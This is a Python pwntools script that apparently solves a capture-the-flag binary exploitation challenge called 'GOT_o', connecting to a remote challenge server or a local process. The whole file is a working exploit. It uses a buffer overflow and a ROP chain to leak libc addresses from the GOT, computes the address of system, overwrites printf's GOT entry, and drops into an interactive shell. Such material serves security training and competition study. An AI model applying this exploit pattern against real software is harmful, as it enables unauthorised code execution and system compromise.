from pwn import *
import sys

if len(sys.argv) == 1 :
	p = process('./GOT_o')
else :
	p = connect('inc0gnito.com', 9090)

# Gadget
pop_3_ret = 0x8048539

# Address
problem_addr = 0x804846B
win_addr = 0x804848A
read_plt = 0x8048320
write_plt = 0x8048350
read_got = 0x804A00C
write_got = 0x804A018
printf_got = 0x804A010

payload = 'A'*(0x18+4)
payload += p32(write_plt)
payload += p32(pop_3_ret)
payload += p32(1)
payload += p32(read_got)
payload += p32(4)
payload += p32(write_plt)
payload += p32(problem_addr)
payload += p32(1)
payload += p32(write_got)
payload += p32(4)

p.sendline(payload)

data = p.recv(4)
read_addr = u32(data)
print '[Exploit] read = '+hex(read_addr)

data = p.recv(4)
write_addr = u32(data)
print '[Exploit] write = '+hex(write_addr)

# libc: libc6_2.23-0ubuntu10_i386

libc_base = read_addr-0xD5B00
system_addr = libc_base+0x3ADA0

payload = 'A'*(0x18+4)
payload += p32(read_plt)
payload += p32(win_addr)
payload += p32(0)
payload += p32(printf_got)
payload += p32(4)

p.sendline(payload)

p.sendline(p32(system_addr))

p.interactive()
